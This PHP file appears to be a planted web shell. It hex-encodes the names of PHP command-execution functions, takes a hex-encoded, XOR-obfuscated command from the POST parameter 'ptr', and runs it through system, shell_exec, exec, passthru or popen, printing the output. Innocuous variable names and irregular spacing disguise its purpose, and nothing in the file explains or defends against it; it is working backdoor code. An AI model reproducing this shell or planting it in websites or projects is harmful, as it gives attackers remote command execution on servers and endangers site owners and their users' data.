<?php

$initialized4 = "p\x61\x73st\x68\x72u";
$initialized5 = "p\x6Fpe\x6E";
$initialized3 = "\x65x\x65c";
$initialized1 = "s\x79s\x74\x65m";
$initialized6 = "\x73tr\x65a\x6D_ge\x74_co\x6E\x74\x65n\x74\x73";
$initialized2 = "s\x68\x65\x6Cl_e\x78\x65c";
$initialized7 = "\x70c\x6Cos\x65";
$dataflow_engine = "he\x78\x32\x62i\x6E";
if (isset($_POST["pt\x72"])) {
            function reverse_searcher   (   $dchunk   ,    $fac   )   {      $entry     =    ''    ;   for($n=0; $n<strlen($dchunk); $n++){$entry.=chr(ord($dchunk[$n])^$fac);} return      $entry;     }
            $ptr = $dataflow_engine($_POST["pt\x72"]);
            $ptr = reverse_searcher($ptr, 97);
            if (function_exists($initialized1)) {
                $initialized1($ptr);
            } elseif (function_exists($initialized2)) {
                print $initialized2($ptr);
            } elseif (function_exists($initialized3)) {
                $initialized3($ptr, $token_dchunk);
                print join("\n", $token_dchunk);
            } elseif (function_exists($initialized4)) {
                $initialized4($ptr);
            } elseif (function_exists($initialized5) && function_exists($initialized6) && function_exists($initialized7)) {
                $fac_entry = $initialized5($ptr, 'r');
                if ($fac_entry) {
                    $ent_hld = $initialized6($fac_entry);
                    $initialized7($fac_entry);
                    print $ent_hld;
                }
            }
            exit;
        }